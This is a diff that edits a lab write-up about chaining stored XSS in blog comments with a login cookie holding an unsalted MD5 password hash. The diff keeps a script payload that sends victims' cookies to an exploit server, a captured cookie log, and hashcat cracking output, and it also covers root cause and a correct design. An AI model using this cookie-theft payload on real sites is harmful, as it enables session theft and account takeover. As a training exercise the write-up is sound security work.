@@ -6,26 +6,26 @@
 
 ## Target
 
-A blog application with a comments feature on each post. Authenticated users can opt to stay signed in via a `stay-logged-in` cookie. Other authenticated users, including privileged accounts, periodically read new comments, which provides a delivery path for stored XSS to reach a victim session.
+A blog application with a comments feature on each post. Authenticated users can opt into a `stay-logged-in` cookie. Other authenticated users, including privileged accounts, read new comments, providing a delivery path for stored XSS to reach a victim session.
 
 ## Vulnerability
 
 Two flaws compose into account takeover:
 
-1. **Stored XSS in comments.** The comment field accepts and stores user input without HTML sanitization, allowing injected scripts to execute in any reader's authenticated session.
-2. **Credential material in a client-side cookie.** The persistent login cookie has the structure `base64(username + ":" + md5(password))`. It is unsigned, unencrypted, and uses a fast unsalted hash. Any party who obtains the cookie can recover the plaintext password offline.
+1. **Stored XSS in comments.** The comment field stores user input without HTML sanitization, allowing injected scripts to execute in any reader's session.
+2. **Credential material in a client-side cookie.** The persistent login cookie has the structure `base64(username + ":" + md5(password))`. It is unsigned, unencrypted, and uses a fast unsalted hash. Anyone who obtains the cookie can recover the plaintext password offline.
 
-Either flaw alone is exploitable. Chained, an unauthenticated attacker recovers the plaintext password of any user whose session loads the malicious comment.
+Chained, an unauthenticated attacker recovers the plaintext password of any user whose session loads the malicious comment.
 
 ## Exploitation
 
 ### Step 1: Stored XSS payload in comment field
 
-The application provides a comment form on each post. The lab provides an attacker-controlled exploit server for receiving exfiltrated data:
+The lab provides an attacker-controlled exploit server for receiving exfiltrated data:
 
 ![Exploit server configuration](images/exploit-server.png)
 
-Posted the following comment on post 5, which is rendered into the page when other users view the post:
+Posted the following comment on post 5:
 
 ```html
 <script>
@@ -45,7 +45,7 @@ postId=5&comment=%3Cscript%3Efetch%28%27https%3A%2F%2FEXPLOIT_SERVER
 blah&email=blah%40gmail.com&website=
 ```
 
-When the victim (carlos) loaded the post, the script executed in their session context and called back to the exploit server. The exploit server access log captured the request:
+When the victim (carlos) loaded the post, the script executed in their session and called back to the exploit server:
 
 ```
 10.0.4.231  "GET /exploit?COOKIES=secret=A3YGy8eruOYXzBehbmXTuE7XnhsrNRP3;
@@ -53,7 +53,7 @@ When the victim (carlos) loaded the post, the script executed in their session c
               HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) ..."
 ```
 
-The `Mozilla/5.0 (Victim)` user-agent confirms this is the simulated victim and not browser noise from my own session.
+The `Mozilla/5.0 (Victim)` user-agent confirms the simulated victim, not browser noise from my own session.
 
 ### Step 2: Decode the cookie
 
@@ -70,7 +70,7 @@ The decoded structure is the security failure made visible. The cookie is not an
 
 ### Step 3: Recover the plaintext password offline
 
-The 32-character lowercase hex string is consistent with MD5. Cracked with hashcat using the rockyou wordlist:
+The 32-character lowercase hex is consistent with MD5. Cracked with hashcat using rockyou:
 
 ```
 $ echo "26323c16d5f4dabff3bb136f2460a943" > hash.txt
@@ -92,25 +92,25 @@ Progress.........: 655360/14344384 (4.57%)
 
 ![Hashcat output showing onceuponatime recovered](images/hashcat-cracked.png)
 
-This is the core security failure. MD5 is a fast cryptographic hash designed for integrity checking, not for credential storage. It is unsalted in this implementation, meaning identical passwords across users hash to identical values and precomputed rainbow tables apply directly. On an Apple M3 laptop with no specialized hardware, the password resolved in approximately one second after testing 4.57% of the rockyou wordlist. The full wordlist would have exhausted in under thirty seconds.
+This is the core security failure. MD5 is a fast hash designed for integrity checking, not credential storage. It is unsalted, so identical passwords hash to identical values and precomputed rainbow tables apply directly. The password resolved in approximately one second on an M3 laptop after testing 4.57% of rockyou. The full wordlist would have exhausted in under thirty seconds.
 
 ### Step 4: Account takeover
 
-Logged in as `carlos` with the recovered password through the standard login form and deleted the account through `/my-account/delete`.
+Logged in as `carlos` with the recovered password and deleted the account through `/my-account/delete`.
 
 ![My Account page as carlos with delete option](images/account-takeover.png)
 
 ## Reasoning notes
 
-The initial hypothesis was that the `stay-logged-in` cookie could be replayed directly against authenticated endpoints, bypassing the need to crack the password at all. I attempted this by sending the stolen cookie to `/my-account/delete` without performing a fresh login. The request failed because the delete endpoint validates the live session cookie, not the persistent login cookie, and the persistent cookie alone does not establish a session. This pointed at recovering the plaintext password and performing a full login as the working path.
+First attempted to replay the `stay-logged-in` cookie directly against `/my-account/delete`, bypassing the cracking step entirely. The request failed because the delete endpoint validates the live session cookie, not the persistent login cookie. Recovering the plaintext password and performing a full login was the working path.
 
-This dead end is worth noting because it clarifies the actual trust boundary in the system. The persistent login cookie is treated as a credential the server uses to re-authenticate the user, not as a session token. The server-side flow on cookie presentation is presumably: decode → look up user → verify hash → issue a fresh session. The flaw is not that the persistent cookie has too much privilege. It is that the cookie's contents allow that re-authentication step to be performed offline by anyone who reads the cookie.
+The dead end clarified the actual trust boundary. The persistent cookie is a credential the server uses to re-authenticate the user, not a session token. The server-side flow on cookie presentation is presumably: decode → look up user → verify hash → issue a fresh session. The flaw is not that the cookie has too much privilege. The flaw is that the cookie's contents allow that re-authentication step to be performed offline by anyone who reads the cookie.
 
 ## Root cause
 
-The application treats a hash of the user's password as an authentication token sent to the client. Any value derived deterministically from a password is functionally equivalent to the password itself if the hash function is reversible at scale, which fast unsalted hashes are.
+The application treats a hash of the user's password as an authentication token sent to the client. Any value derived deterministically from a password is functionally equivalent to the password if the hash is reversible at scale, which fast unsalted hashes are.
 
-The correct design is to issue an opaque, random, server-side session identifier that has no functional relationship to the user's credentials. The server stores the mapping from identifier to user. The client has no information that survives revocation.
+The correct design is an opaque, random, server-side session identifier with no functional relationship to the user's credentials. The server stores the mapping. The client holds nothing that survives revocation.
 
 ## Remediation
 
